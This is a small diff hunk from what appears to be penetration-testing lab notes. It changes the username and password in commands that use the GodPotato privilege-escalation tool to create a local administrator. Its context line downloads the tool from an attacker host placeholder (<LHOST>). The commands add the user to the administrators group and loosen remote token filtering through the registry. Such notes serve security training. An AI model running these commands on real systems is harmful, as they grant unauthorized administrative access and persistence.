@@ -2172,8 +2172,8 @@ iwr http://<LHOST>/GodPotato-NET4.exe -Outfile gp.exe
 Lab-only local admin creation:
 
 ```powershell
-.\gp.exe -cmd "net user /add hacker Password123!"
-.\gp.exe -cmd "net localgroup administrators hacker /add"
+.\gp.exe -cmd "net user /add elma P@ssword123"
+.\gp.exe -cmd "net localgroup administrators elma /add"
 .\gp.exe -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
 ```
 
